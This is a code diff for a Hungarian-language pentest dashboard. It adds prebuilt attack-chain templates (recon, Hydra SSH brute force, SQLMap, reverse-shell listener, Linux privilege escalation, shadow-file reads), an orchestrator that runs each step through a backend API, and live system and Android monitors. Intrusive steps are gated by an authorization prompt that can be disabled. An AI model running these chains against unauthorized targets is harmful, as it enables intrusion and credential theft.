+  return out||'<div class="dempty" style="padding:6px 10px">Nincs beköthető parancs ide. Kapcsold ki a „csak beköthető" szűrőt, vagy válassz másik ágat.</div>';}
+/* Beépített sablonok (kész folyamatok) — lib = index a PTLIB-ben */
+const PTTPL=[
+ {n:'Gyors recon (domén)',d:'WHOIS, DNS, ping, HTTP-fejléc',nodes:[
+   {id:'a',lib:0,parent:null,via:'target'},{id:'b',lib:1,parent:null,via:'target'},{id:'c',lib:2,parent:null,via:'target'},{id:'d',lib:4,parent:null,via:'target'},{id:'e',lib:7,parent:null,via:'target'},{id:'f',lib:10,parent:null,via:'target'}]},
+ {n:'DNS / OSINT mély',d:'WHOIS, DIG NS/ANY/MX/TXT, theHarvester, FFUF, zone transfer',nodes:[
+   {id:'a',lib:0,parent:null,via:'target'},{id:'b',lib:3,parent:null,via:'target'},{id:'c',lib:2,parent:null,via:'target'},{id:'d',lib:4,parent:null,via:'target'},{id:'e',lib:5,parent:null,via:'target'},{id:'f',lib:6,parent:null,via:'target'},{id:'g',lib:26,parent:null,via:'target'},{id:'h',lib:9,parent:'b',via:'dns'}]},
+ {n:'Subdomain / asset felderítés',d:'theHarvester, FFUF subdomain, zone transfer',nodes:[
+   {id:'a',lib:6,parent:null,via:'target'},{id:'b',lib:26,parent:null,via:'target'},{id:'c',lib:3,parent:null,via:'target'},{id:'d',lib:9,parent:'c',via:'dns'}]},
+ {n:'Port- és szolgáltatás-scan',d:'Nmap alap/teljes/UDP, Masscan, Portok riport',nodes:[
+   {id:'a',lib:12,parent:null,via:'target'},{id:'b',lib:57,parent:'a',via:'ports'},{id:'c',lib:13,parent:null,via:'target'},{id:'d',lib:14,parent:null,via:'target'},{id:'e',lib:20,parent:null,via:'target'}]},
+ {n:'Teljes felderítés (host)',d:'Ping, traceroute, Nmap alap/UDP, HTTP-fejléc, riport',nodes:[
+   {id:'a',lib:7,parent:null,via:'target'},{id:'b',lib:8,parent:null,via:'target'},{id:'c',lib:12,parent:null,via:'target'},{id:'d',lib:57,parent:'c',via:'ports'},{id:'e',lib:14,parent:null,via:'target'},{id:'f',lib:10,parent:null,via:'target'}]},
+ {n:'Web app teszt',d:'HTTP-fejléc → Gobuster → SQLMap/XSS, Nikto, robots, riportok',nodes:[
+   {id:'a',lib:10,parent:null,via:'target'},{id:'b',lib:23,parent:'a',via:'web'},{id:'c',lib:34,parent:'b',via:'path'},{id:'d',lib:59,parent:'c',via:'loot'},{id:'e',lib:39,parent:'b',via:'path'},{id:'f',lib:24,parent:'a',via:'web'},{id:'g',lib:58,parent:'f',via:'vuln'},{id:'h',lib:11,parent:null,via:'target'},{id:'i',lib:17,parent:null,via:'target'}]},
+ {n:'Belső háló scan',d:'Ping sweep, Nmap alap → vuln → riport, nc portok',nodes:[
+   {id:'a',lib:21,parent:null,via:'target'},{id:'b',lib:12,parent:null,via:'target'},{id:'c',lib:16,parent:'b',via:'ports'},{id:'d',lib:58,parent:'c',via:'vuln'},{id:'e',lib:57,parent:'b',via:'ports'},{id:'f',lib:22,parent:null,via:'target'}]},
+ {n:'SMB / Windows enum',d:'Nmap SMB-vuln → riport, Enum4linux, SMBclient/SMBmap, CrackMapExec',nodes:[
+   {id:'a',lib:18,parent:null,via:'target'},{id:'b',lib:58,parent:'a',via:'vuln'},{id:'c',lib:27,parent:null,via:'target'},{id:'d',lib:28,parent:null,via:'target'},{id:'e',lib:29,parent:null,via:'target'},{id:'f',lib:30,parent:null,via:'target'}]},
+ {n:'Sebezhetőség-vizsgálat',d:'Nmap agresszív → Searchsploit → riport, Nmap vuln/SSL/SMB',nodes:[
+   {id:'a',lib:15,parent:null,via:'target'},{id:'b',lib:38,parent:'a',via:'vuln'},{id:'c',lib:58,parent:'b',via:'vuln'},{id:'d',lib:16,parent:'a',via:'ports'},{id:'e',lib:19,parent:null,via:'target'},{id:'f',lib:58,parent:'e',via:'vuln'},{id:'g',lib:18,parent:null,via:'target'}]},
+ {n:'SSL/TLS audit',d:'Nmap SSL → riport, HTTP-fejléc',nodes:[
+   {id:'a',lib:19,parent:null,via:'target'},{id:'b',lib:58,parent:'a',via:'vuln'},{id:'c',lib:10,parent:null,via:'target'}]},
+ {n:'Jelszó-támadás',d:'Nmap → Hydra SSH → SSH login → whoami; Hydra HTTP',nodes:[
+   {id:'a',lib:12,parent:null,via:'target'},{id:'b',lib:36,parent:'a',via:'ports'},{id:'c',lib:43,parent:'b',via:'cred'},{id:'d',lib:44,parent:'c',via:'shell'},{id:'e',lib:10,parent:null,via:'target'},{id:'f',lib:37,parent:'e',via:'web'}]},
+ {n:'Post-exploit (shell után)',d:'Nmap → Hydra → SSH login → id/sudo/SUID/kernel/LinPEAS/shadow',nodes:[
+   {id:'a',lib:12,parent:null,via:'target'},{id:'b',lib:36,parent:'a',via:'ports'},{id:'c',lib:43,parent:'b',via:'cred'},{id:'d',lib:44,parent:'c',via:'shell'},{id:'e',lib:45,parent:'c',via:'shell'},{id:'f',lib:46,parent:'c',via:'shell'},{id:'g',lib:51,parent:'c',via:'shell'},{id:'h',lib:54,parent:'c',via:'shell'},{id:'i',lib:49,parent:'c',via:'shell'}]},
+ {n:'FTP / SNMP / szolgáltatás-adat',d:'FTP anon → rendszer-riport, SNMP walk, Nmap → SSH-audit',nodes:[
+   {id:'a',lib:32,parent:null,via:'target'},{id:'b',lib:60,parent:'a',via:'loot'},{id:'c',lib:31,parent:null,via:'target'},{id:'d',lib:12,parent:null,via:'target'},{id:'e',lib:33,parent:'d',via:'ports'}]},
+ {n:'Teljes behatolás-lánc (minta)',d:'recon→scan→vuln→exploit→post→riport, elágazva',nodes:[
+   {id:'a',lib:12,parent:null,via:'target'},{id:'b',lib:16,parent:'a',via:'ports'},{id:'c',lib:38,parent:'b',via:'vuln'},{id:'d',lib:58,parent:'c',via:'vuln'},{id:'e',lib:36,parent:'a',via:'ports'},{id:'f',lib:43,parent:'e',via:'cred'},{id:'g',lib:54,parent:'f',via:'shell'},{id:'h',lib:49,parent:'g',via:'shell'},{id:'i',lib:59,parent:'h',via:'cred'},{id:'j',lib:10,parent:null,via:'target'},{id:'k',lib:24,parent:'j',via:'web'}]},
+ {n:'Gyors sebezhetőség + riport',d:'Nmap agresszív → port/vuln riport; Nmap HTTP → Nikto → riport',nodes:[
+   {id:'a',lib:15,parent:null,via:'target'},{id:'b',lib:57,parent:'a',via:'ports'},{id:'c',lib:58,parent:'a',via:'vuln'},{id:'e',lib:17,parent:null,via:'target'},{id:'f',lib:24,parent:'e',via:'web'},{id:'g',lib:58,parent:'f',via:'vuln'}]},
+ {n:'Webkönyvtár-feltérképezés',d:'HTTP-fejléc → Gobuster + Dirb, robots, Nmap HTTP',nodes:[
+   {id:'a',lib:10,parent:null,via:'target'},{id:'b',lib:23,parent:'a',via:'web'},{id:'c',lib:25,parent:'a',via:'web'},{id:'d',lib:11,parent:null,via:'target'},{id:'e',lib:17,parent:null,via:'target'}]},
+ {n:'SQL injection fókusz',d:'HTTP-fejléc → Gobuster → SQLMap → loot-riport; SQLMap POST',nodes:[
+   {id:'a',lib:10,parent:null,via:'target'},{id:'b',lib:23,parent:'a',via:'web'},{id:'c',lib:34,parent:'b',via:'path'},{id:'d',lib:59,parent:'c',via:'loot'},{id:'e',lib:35,parent:'a',via:'web'}]},
+ {n:'XSS / input fuzzing',d:'Nmap HTTP → Gobuster → XSS → vuln-riport; path traversal',nodes:[
+   {id:'a',lib:17,parent:null,via:'target'},{id:'b',lib:23,parent:'a',via:'web'},{id:'c',lib:39,parent:'b',via:'path'},{id:'d',lib:58,parent:'c',via:'vuln'},{id:'e',lib:40,parent:'a',via:'web'}]},
+ {n:'Metasploit-alap',d:'Nmap agresszív → Searchsploit; MSF portscan',nodes:[
+   {id:'a',lib:15,parent:null,via:'target'},{id:'b',lib:38,parent:'a',via:'vuln'},{id:'c',lib:41,parent:null,via:'target'}]},
+ {n:'Reverse shell + enum',d:'Netcat listener → id/sudo/hálózat (fogadás után)',nodes:[
+   {id:'a',lib:42,parent:null,via:'target'},{id:'b',lib:44,parent:'a',via:'shell'},{id:'c',lib:45,parent:'a',via:'shell'},{id:'d',lib:48,parent:'a',via:'shell'}]},
+ {n:'Linux privesc (shell után)',d:'Nmap → Hydra → SSH login → sudo/SUID/crontab/kulcsok/írható/LinPEAS/env',nodes:[
+   {id:'a',lib:12,parent:null,via:'target'},{id:'b',lib:36,parent:'a',via:'ports'},{id:'c',lib:43,parent:'b',via:'cred'},{id:'d',lib:45,parent:'c',via:'shell'},{id:'e',lib:46,parent:'c',via:'shell'},{id:'f',lib:47,parent:'c',via:'shell'},{id:'g',lib:52,parent:'c',via:'shell'},{id:'h',lib:55,parent:'c',via:'shell'},{id:'i',lib:54,parent:'c',via:'shell'},{id:'j',lib:53,parent:'c',via:'shell'}]},
+ {n:'Hálózati felmérés (shell után)',d:'Nmap → Hydra → SSH login → hálózat/folyamatok/crontab',nodes:[
+   {id:'a',lib:12,parent:null,via:'target'},{id:'b',lib:36,parent:'a',via:'ports'},{id:'c',lib:43,parent:'b',via:'cred'},{id:'d',lib:48,parent:'c',via:'shell'},{id:'e',lib:50,parent:'c',via:'shell'},{id:'f',lib:47,parent:'c',via:'shell'}]},
+ {n:'Teljes riport (összegzés)',d:'Nmap agresszív → port/vuln riport; Nikto; FTP → rendszer-riport',nodes:[
+   {id:'a',lib:15,parent:null,via:'target'},{id:'b',lib:57,parent:'a',via:'ports'},{id:'c',lib:58,parent:'a',via:'vuln'},{id:'d',lib:10,parent:null,via:'target'},{id:'e',lib:24,parent:'d',via:'web'},{id:'f',lib:32,parent:null,via:'target'},{id:'g',lib:60,parent:'f',via:'loot'}]},
+ {n:'E-mail / levelezés OSINT',d:'DIG MX, DIG TXT/SPF, theHarvester, WHOIS',nodes:[
+   {id:'a',lib:4,parent:null,via:'target'},{id:'b',lib:5,parent:null,via:'target'},{id:'c',lib:6,parent:null,via:'target'},{id:'d',lib:0,parent:null,via:'target'}]},
+ {n:'Élő-host + port térkép',d:'Ping, Ping sweep, Nmap alap, nc top portok',nodes:[
+   {id:'a',lib:7,parent:null,via:'target'},{id:'b',lib:21,parent:null,via:'target'},{id:'c',lib:12,parent:null,via:'target'},{id:'d',lib:22,parent:null,via:'target'}]},
+ {n:'UDP / szolgáltatás-specifikus',d:'Nmap UDP, SNMP walk, FTP anonymous',nodes:[
+   {id:'a',lib:14,parent:null,via:'target'},{id:'b',lib:31,parent:null,via:'target'},{id:'c',lib:32,parent:null,via:'target'}]},
+ {n:'SSH biztonsági audit',d:'Nmap alap → SSH-audit → vuln-riport; Hydra SSH',nodes:[
+   {id:'a',lib:12,parent:null,via:'target'},{id:'b',lib:33,parent:'a',via:'ports'},{id:'c',lib:58,parent:'b',via:'vuln'},{id:'d',lib:36,parent:'a',via:'ports'}]},
+];
+/* ── Orchestrátor (önműködő futás + adat-busz) ── */
+let ORCH=null,VARS={},PTSTOPERR=true;
+function ptToolOf(i){let c=ptCmd(i).trim().replace(/^\(\s*/,'');for(let k=0;k<4;k++){c=c.replace(/^sudo\s+/,'').replace(/^timeout\s+\d+\s+/,'');}const m=c.match(/^[A-Za-z0-9_.\/-]+/);let t=m?m[0].split('/').pop():'';const map={theHarvester:'theharvester',crackmapexec:'netexec'};return map[t]||t;}
+function orchLed(st){return ({wait:'',run:'y',ok:'g',fail:'r',skip:'b',tool:'y'})[st]||'';}
+function substVars(s){let o=String(s).replace(/<célpont>/g,VARS.TARGET||'').replace(/<\$TARGET>/g,VARS.TARGET||'');return o.replace(/<\$([A-Z_]+)>/g,(m,k)=>(VARS[k]!=null&&VARS[k]!=='')?VARS[k]:m);}
+function parseOut(buf,outs){const add=(k,v)=>{if(v!=null&&v!=='')VARS[k]=v;};
+  if(outs.includes('ports')){const p=[...buf.matchAll(/^(\d+)\/tcp\s+open/gmi)].map(m=>m[1]);if(p.length)add('PORTS',p.join(','));}
+  if(outs.includes('service')){const s=buf.match(/\b\d+\/tcp\s+open\s+(\S+)/i);if(s)add('SERVICE',s[1]);}
+  if(outs.includes('web')){const u=buf.match(/https?:\/\/[^\s"'<>]+/i);add('WEBURL',u?u[0]:(VARS.TARGET?'http://'+VARS.TARGET:''));}
+  if(outs.includes('ip')){const ip=buf.match(/\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b/);if(ip)add('IP',ip[1]);}
+  if(outs.includes('cred')){const c=buf.match(/login:\s*(\S+)\s+password:\s*(\S+)/i);if(c){add('USER',c[1]);add('PASS',c[2]);}}
+  if(outs.includes('subdomain')){const s=buf.match(/\b([a-z0-9][a-z0-9-]*\.[a-z0-9.-]+\.[a-z]{2,})\b/i);if(s)add('SUBDOMAIN',s[1]);}
+  if(outs.includes('btDev')){const b=buf.match(/Device\s+([0-9A-F:]{17})/i);if(b)add('BTMAC',b[1]);}
+  if(outs.includes('androidDev')){const d=buf.match(/^(\S+)\s+device\b/mi);if(d)add('SERIAL',d[1]);}
+  if(outs.includes('pkg')){const p=buf.match(/package:(\S+)/i);if(p)add('PKG',p[1]);}
+  if(outs.includes('apk')){const a=buf.match(/package:(\S+\.apk)/i);if(a)add('APK',a[1]);}
+  if(outs.includes('ap')){const b=buf.match(/([0-9A-F]{2}(?::[0-9A-F]{2}){5})/i);if(b)add('BSSID',b[1]);}}
+function orchBuildCmd(n){const c=substVars(ptCmd(n.lib));const f=ptOut(n.lib).filter(o=>PTFILE[o]).map(o=>'/tmp/eth/'+PTFILE[o]);return f.length?`( ${c} ) 2>&1 | tee -a ${f.join(' ')}`:c;}
+function orchSend(cmd){ORCH.awaiting=true;ORCH.buf='';fetch('/api/pentest/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({terminalId:1,command:cmd})}).then(r=>r.json()).then(d=>{if(d&&d.error){renderLine({raw:'[!] '+(d.message||d.error),type:'error'},'ptOut');orchOnDone(-1);}}).catch(()=>orchOnDone(-1));}
+async function ptfRunStart(){
+  if(ORCH&&ORCH.running){toast('Már fut egy folyamat','warning');return;}
+  const t=(PTFLOW.target||'').trim();if(!t){toast('Adj meg Célpontot','warning');return;}
+  const order=ptOrder();if(!order.length){toast('Üres folyamat','warning');return;}
+  try{PT.tools=await fetch('/api/pentest/tools').then(r=>r.json());}catch(e){}
+  VARS={TARGET:t};
+  ORCH={order,idx:-1,running:true,paused:false,stop:false,phase:'setup',status:{},buf:'',awaiting:false};
+  order.forEach(n=>ORCH.status[n.id]='wait');
+  renderLine({raw:'[*] ▶ Folyamat indul — '+order.length+' lépés · cél: '+t,type:'action'},'ptOut');
+  renderDrawer();
+  orchSend('mkdir -p /tmp/eth /tmp/eth/wifi /tmp/eth/bt /tmp/eth/android ; rm -f /tmp/eth/*.txt 2>/dev/null; echo OK');
+}
+function orchStep(){
+  if(!ORCH||!ORCH.running)return;
+  if(ORCH.stop){orchFinish('leállítva');return;}
+  if(ORCH.paused)return;
+  ORCH.idx++;
+  if(ORCH.idx>=ORCH.order.length){orchFinish('kész');return;}
+  const n=ORCH.order[ORCH.idx],tool=ptToolOf(n.lib);
+  if(tool&&PT.tools&&PT.tools[tool]===false){ORCH.status[n.id]='skip';renderLine({raw:'[↷] '+ptLabel(n.lib)+': hiányzó eszköz ('+tool+') → kihagyva (telepítsd a node-nál).',type:'warning'},'ptOut');renderDrawer();setTimeout(orchStep,30);return;}
+  const cmd=orchBuildCmd(n),rk=ptRisk(n.lib);
+  if((rk==='intrusive'||rk==='destructive')&&!PTCONSENT){if(!confirm('⚠ '+(PTRISKL[rk]||rk).toUpperCase()+' lépés: '+ptLabel(n.lib)+'\n\n'+cmd+'\n\nCsak saját vagy írásosan engedélyezett célon! Futtatod ezt a lépést?')){ORCH.status[n.id]='skip';renderLine({raw:'[↷] '+ptLabel(n.lib)+' kihagyva (intruzív, nem engedélyezve).',type:'warning'},'ptOut');renderDrawer();setTimeout(orchStep,30);return;}}
+  ORCH.status[n.id]='run';renderDrawer();
+  renderLine({raw:'$ ['+(ORCH.idx+1)+'/'+ORCH.order.length+'] '+ptLabel(n.lib)+' · '+(PTRISKL[rk]||rk),type:'action'},'ptOut');
+  renderLine({raw:cmd,type:'scan'},'ptOut');
+  ORCH.phase='node';orchSend(cmd);
+}
+function orchOnDone(code){
+  if(!ORCH||!ORCH.awaiting)return;ORCH.awaiting=false;
+  if(ORCH.phase==='setup'){ORCH.phase='node';orchStep();return;}
+  const n=ORCH.order[ORCH.idx];
+  if(n){ORCH.status[n.id]=(code===0||code==null)?'ok':'fail';try{parseOut(ORCH.buf,ptOut(n.lib));}catch(e){}renderDrawer();
+    if(code&&code!==0&&PTSTOPERR&&!ORCH.stop){renderLine({raw:'[✗] Lépés hibázott (kód '+code+') — leállás (hibánál állj meg).',type:'error'},'ptOut');orchFinish('hiba');return;}}
+  if(ORCH.stop){orchFinish('leállítva');return;}
+  if(ORCH._step1){ORCH._step1=false;ORCH.paused=true;renderLine({raw:'[⏸] Egy lépés kész — szünet.',type:'action'},'ptOut');renderDrawer();return;}
+  if(ORCH.paused){renderDrawer();return;}
+  orchStep();
+}
+function orchFinish(how){const vs=Object.keys(VARS).filter(k=>k!=='TARGET').map(k=>'$'+k+'='+VARS[k]);renderLine({raw:'[*] ■ Folyamat vége: '+how+(vs.length?' · adat-busz: '+vs.join('  '):''),type:how==='kész'?'success':'warning'},'ptOut');if(ORCH)ORCH.running=false;renderDrawer();}
+function ptFlowHtml(){ptLoadScope(flowScope());const roots=ptRoots(),leaves=ptLeafCount(),anyMiss=PTFLOW.nodes.some(n=>ptMissing(n).length),saved=Object.keys(PTSAVED).filter(nm=>!PTSAVED[nm]._scope||PTSAVED[nm]._scope===flowScope()||flowScope()==='pentest');
+  return `<div class="ptflow">
+    <div class="dtool">${ORCH&&ORCH.running?`<button class="btn sm" data-act="ptfPause">${ORCH.paused?'▶ Folytat':'⏸ Szünet'}</button><button class="btn sm" data-act="ptfStep">⏭ Lépés</button><button class="btn sm dng" data-act="ptfStop">${svg(GL.stop,2)} Leállít</button>`:`<button class="btn sm pri" data-act="ptfRun">${svg(GL.play,2)} Indítás</button><button class="btn sm" data-act="ptfNew">${svg(GL.plus,2)} Új</button>`}<span class="grow"></span><span class="muted" style="font-size:11px">${PTFLOW.nodes.length} lépés · ■ ${leaves} eredmény${PTFLOW.nodes.some(n=>['intrusive','destructive'].includes(ptRisk(n.lib)))?' · <span style="color:#ff7b72">⚠ intruzív</span>':''}</span></div>
+    <div class="ptfrow"><label>Célpont</label><input class="in mono" data-in="ptfTarget" value="${esc(PTFLOW.target||'')}" placeholder="scanme.nmap.org / IP / tartomány"></div>
+    <div class="ptfbar"><label class="ck" style="font-size:11px"><input type="checkbox" data-in="ptfStopErr" ${PTSTOPERR?'checked':''}> hibánál állj meg</label><label class="ck" style="font-size:11px" title="Bekapcsolva nem kérdez rá minden intruzív lépésnél (saját/engedélyezett cél)"><input type="checkbox" data-in="ptfConsent" ${PTCONSENT?'checked':''}> ⚠ intruzív engedélyezve</label>${ORCH&&ORCH.running?`<span class="muted" style="font-size:11px">⏱ fut: ${Math.min(ORCH.idx+1,ORCH.order.length)}/${ORCH.order.length}${ORCH.paused?' · ⏸ szünet':''}</span>`:(ORCH?`<span class="muted" style="font-size:11px">kész</span>`:'')}</div>
+    ${anyMiss?'<div class="ptmiss" style="margin:2px 10px">⚠ Van hiányzó bemenetű lépés — a futtatás így is megy, nézd át a ⚠ jelűeket.</div>':''}
+    <div class="ptfbar"><button class="addbr ${PTFSEL==null?'on':''}" data-act="ptfRootMode">＋ gyökér (Célpontból)</button>${PTFSEL!=null?`<span class="muted" style="font-size:11px">beszúrás ide: ⇢ ${esc(ptLbl(PTFVIA))}</span>`:''}</div>
+    <div class="pttree">${roots.length?roots.map(ptNodeHtml).join(''):'<div class="dempty" style="padding:8px 10px">Nincs lépés. Lent a Parancstárból válassz egy gyökér lépést (Célpont bemenettel).</div>'}</div>
+    <div class="dtool" style="margin-top:6px"><input class="in" data-in="ptfSearch" value="${esc(PTFSEARCH)}" placeholder="parancs keresése…" style="flex:1"><label class="ck" style="white-space:nowrap;font-size:11px"><input type="checkbox" data-in="ptfFilter" ${PTFFILTER?'checked':''}> csak beköthető</label></div>
+    <div class="ptpalette">${ptPaletteHtml()}</div>
+    ${flowScope()==='pentest'?`<div class="scan-cat" style="padding:8px 10px 2px">Sablonok (beépített) — kattints a betöltéshez</div>
+    ${PTTPL.map((t,i)=>`<div class="hist ptpal" data-act="ptfTpl" data-k="${i}" style="cursor:pointer" title="${esc(t.d)}"><span class="ptcat sm" style="--c:#9aa4b2">sablon</span><span class="ht" style="flex:1"><b>${esc(t.n)}</b> <span class="muted" style="font-size:11px">— ${esc(t.d)}</span></span><span class="hm">${t.nodes.length} lépés</span></div>`).join('')}`:''}
+    <div class="scan-cat" style="padding:8px 10px 2px">Mentett folyamatok</div>
+    <div class="dtool"><input class="in" data-in="ptfName" value="${esc(PTFNAME)}" placeholder="folyamat neve…" style="flex:1"><button class="btn sm" data-act="ptfSaveAs">${svg(GL.save,2)} Mentés</button></div>
+    ${saved.length?saved.map(nm=>`<div class="hist"><span class="ht" data-act="ptfOpen" data-k="${esc(nm)}" style="cursor:pointer;flex:1">${esc(nm)}</span><span class="hm">${(PTSAVED[nm].nodes||[]).length} lépés</span><button class="ptx" data-act="ptfDelSaved" data-k="${esc(nm)}">×</button></div>`).join(''):'<div class="dempty" style="padding:4px 10px">Nincs mentett folyamat.</div>'}
+  </div>`;}
 async function ptLoadScriptsSel(){const sel=$('#ptScriptSel');if(!sel)return;try{PT.scripts=await fetch('/api/pentest/scripts').then(r=>r.json());sel.length=1;PT.scripts.forEach(s=>{const o=el('option');o.value=s.id;o.textContent=s.name+'.'+s.filetype;sel.appendChild(o);});}catch(e){}}
 async function ptToolsFetch(){try{PT.tools=await fetch('/api/pentest/tools').then(r=>r.json());}catch(e){PT.tools={};}if(curTool==='ext')renderDrawer();}
 function ptExtDetail(t,inst){
@@ -535,12 +839,41 @@ const EXTLIST={
     {name:'hcxtools',desc:'PMKID / hash konverzió',apt:'sudo apt install hcxtools'},
     {name:'hashcat',desc:'GPU hash-törés',apt:'sudo apt install hashcat'}],
   pentest:PTTOOLS,
+  webapp:PTTOOLS.filter(t=>t.cat==='web'),
 };
 function ptRunScript(id){const s=PT.scripts.find(x=>x.id===id);if(!s)return;const interp={sh:'bash',py:'python3',rb:'ruby'}[s.filetype]||'bash';
   const cmd=`${interp} uploads/${s.filename}`;ptRunCmd(cmd);}
 const PT_TERM={1:'ptOut',2:'vedOut',3:'updOut'};
 function ptRunCmd(command,terminalId,termId){terminalId=terminalId||1;termId=termId||'ptOut';cmdHistPush(command);renderLine({raw:'$ '+command,type:'action'},termId);timerStart(termId);
   fetch('/api/pentest/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({terminalId,command})}).then(r=>r.json()).then(d=>{if(d&&d.error)renderLine({raw:'[!] '+(d.message||d.error),type:'error'},termId);}).catch(e=>renderLine({raw:'[!] '+e,type:'error'},termId));}
+
+/* ── MONITOROZÁS (élő figyelők) ── */
+const MONCAT={net:'Hálózat / Rendszer',bt:'Bluetooth',android:'Android'};
+const MONLIST=[
+ {key:'proc',cat:'net',label:'Folyamatok',desc:'Top CPU 2mp-enként',cmd:'while true; do ps aux | sort -rk3 | head -12; echo "--- "$(date +%H:%M:%S); sleep 2; done'},
+ {key:'conn',cat:'net',label:'Kapcsolatok',desc:'Aktív TCP kapcsolatok',cmd:'while true; do (ss -tunp 2>/dev/null || netstat -an | grep -iE "estab|listen" | head -20); echo "---"; sleep 2; done'},
+ {key:'ports',cat:'net',label:'Port-őr',desc:'Figyelő portok',cmd:'while true; do (ss -tln 2>/dev/null || netstat -an | grep -i listen | head -20); echo "---"; sleep 3; done'},
+ {key:'users',cat:'net',label:'Userek',desc:'Bejelentkezett userek',cmd:'while true; do who; echo "--- "$(date +%H:%M:%S); sleep 3; done'},
+ {key:'authlog',cat:'net',label:'Auth-napló',desc:'Bejelentkezések élő',cmd:'tail -f /var/log/auth.log 2>/dev/null || journalctl -f -n 20 2>/dev/null || echo "[nincs auth.log — Linux kell]"'},
+ {key:'tcpdump',cat:'net',label:'Forgalom (tcpdump)',desc:'Csomagok élőben (root)',cmd:'tcpdump -i any -n -l 2>/dev/null || echo "[tcpdump + root kell]"'},
+ {key:'fschange',cat:'net',label:'Fájlváltozás',desc:'/etc figyelése',cmd:'inotifywait -m -r /etc 2>/dev/null || echo "[inotify-tools kell — Linux]"'},
+ {key:'btmon',cat:'bt',label:'HCI monitor',desc:'Bluetooth HCI élő',cmd:'btmon 2>/dev/null || echo "[btmon (bluez) + adapter kell]"'},
+ {key:'bluelog',cat:'bt',label:'BT-log',desc:'Környező BT-eszközök',cmd:'bluelog -v 2>/dev/null || echo "[bluelog + adapter kell]"'},
+ {key:'logcat',cat:'android',label:'Élő logcat',desc:'Android rendszer-log',cmd:'adb logcat 2>/dev/null || echo "[adb + csatlakoztatott telefon kell]"'},
+ {key:'abatt',cat:'android',label:'Akku / hő',desc:'Akkumulátor-állapot',cmd:'while true; do adb shell dumpsys battery 2>/dev/null || echo "[adb kell]"; echo "---"; sleep 3; done'},
+ {key:'anet',cat:'android',label:'Hálózat (telefon)',desc:'Android kapcsolatok',cmd:'while true; do adb shell netstat -tn 2>/dev/null || echo "[adb kell]"; echo "---"; sleep 3; done'},
+];
+let MON={running:{}};const MONTAG={};
+function monFreeTid(){for(let t=4;t<=14;t++){if(!Object.values(MON.running).some(r=>r.tid===t))return t;}return 4;}
+function monBtn(key){const btn=document.querySelector('[data-act="monToggle"][data-k="'+key+'"]');if(btn){const run=!!MON.running[key];btn.classList.toggle('on',run);const si=btn.querySelector('.si');if(si)si.textContent=run?'■':'▶';}const a=$('#monActive');if(a)a.textContent=Object.keys(MON.running).length;}
+function monStartOne(key){const m=MONLIST.find(x=>x.key===key);if(!m||MON.running[key])return;const tid=monFreeTid(),tag=(m.label.replace(/[^A-Za-zÀ-ű]/g,'').slice(0,3)||'MON').toUpperCase();MON.running[key]={tid,tag};MONTAG[tid]=tag;renderLine({raw:'['+tag+'] ▶ indul: '+m.label,type:'action'},'monOut');fetch('/api/pentest/run',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({terminalId:tid,command:m.cmd})}).catch(()=>{});monBtn(key);}
+function monStopOne(key){const r=MON.running[key];if(!r)return;fetch('/api/pentest/kill',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({terminalId:r.tid})}).catch(()=>{});renderLine({raw:'['+r.tag+'] ⏹ leállítva',type:'action'},'monOut');delete MONTAG[r.tid];delete MON.running[key];monBtn(key);}
+VIEWS.monitor=()=>`
+  ${intro('pulse','Élő figyelők: hálózat/rendszer, Bluetooth, Android. Indíts egyet (vagy többet) — a kimenet élőben, [TAG]-gel jelölve folyik. A hardverfüggők a uConsole-on élnek. Csak saját vagy engedélyezett eszköz!','warn')}
+  <div class="tbar"><span class="muted" style="font-size:11px">Aktív figyelők: <b id="monActive">${Object.keys(MON.running).length}</b></span><span class="grow"></span><button class="btn sm dng" data-act="monStopAll">${svg(GL.stop,2)} Mind leállít</button></div>
+  ${Object.keys(MONCAT).map(cat=>`<div class="scan-cat">${esc(MONCAT[cat])}</div><div class="scan-grid">${MONLIST.filter(m=>m.cat===cat).map(m=>{const run=!!MON.running[m.key];return `<button class="scan-btn ${run?'on':''}" data-act="monToggle" data-k="${m.key}"><span class="si">${run?'■':'▶'}</span><b>${esc(m.label)}</b><small>${esc(m.desc)}</small></button>`;}).join('')}</div>`).join('')}
+  <div class="grow1"><div class="console"><div class="cons-hd">Monitor — élő kimenet<span class="ch-r"><span class="tcount">0 sor</span><button class="cbtn" data-act="monClear">${svg(GL.trash,2)}Törlés</button><input class="tfilter" data-tfilter="monOut" placeholder="szűrés…"></span></div><div class="term" id="monOut" tabindex="0"><div class="t-welcome">Válassz figyelőt fent. Több is futhat egyszerre; minden sor [TAG]-gel jelzi, melyik figyelőtől jött.</div></div></div></div>`;
+MOUNT.monitor=()=>{};
 
 /* ── TUDÁSBÁZIS ── */
 const KBDOCS=[['guide','0. Kezdő lépések'],['legal','1. Jogi háttér'],['method','2. Pentest módszertan'],['nmap','3. Nmap deep dive'],['wifi','4. Wireless security'],['platforms','5. Gyakorló platformok']];
@@ -587,17 +920,18 @@ VIEWS.settings=()=>{const treeOff=document.body.classList.contains('tree-off');c
 VIEWS._stub=id=>`${intro('doc','Ez a modul tervezés alatt.')}${box(TITLE[id]||'Modul','<p class="muted">Hamarosan.</p>')}`;
 
 /* ═══════════════ JOBB OLDALI PANEL ═══════════════ */
-const TERMID={nmap:'nmapOut',wifite:'wifiteOut',pentest:'ptOut',vedelem:'vedOut'};
-const CMDID={nmap:'nmapOutCmd',wifite:'wifiteOutCmd',pentest:'ptOutCmd'};
+const TERMID={nmap:'nmapOut',wifite:'wifiteOut',pentest:'ptOut',vedelem:'vedOut',webapp:'webappOut',android:'androidOut',radio:'radioOut'};
+const CMDID={nmap:'nmapOutCmd',wifite:'wifiteOutCmd',pentest:'ptOutCmd',webapp:'webappOutCmd'};
+let BTLAST=[],WALAST=null,RADLAST=null;
 const RAIL=[{id:'ctx',label:'Nézet',glyph:'grid'},{id:'ext',label:'Bővítm.',glyph:'puzzle'},{id:'desc',label:'Leírás',glyph:'doc'},{id:'flow',label:'Folyamat',glyph:'flow'},{id:'tasks',label:'Teendők',glyph:'tasks'},{sep:1},
   {id:'export',label:'Export',glyph:'dl'},{id:'hist',label:'Előzmény',glyph:'history'},{sep:1},
   {id:'quick',label:'Beáll.',glyph:'gear'},{id:'ref',label:'Referencia',glyph:'book'},{sep:1},
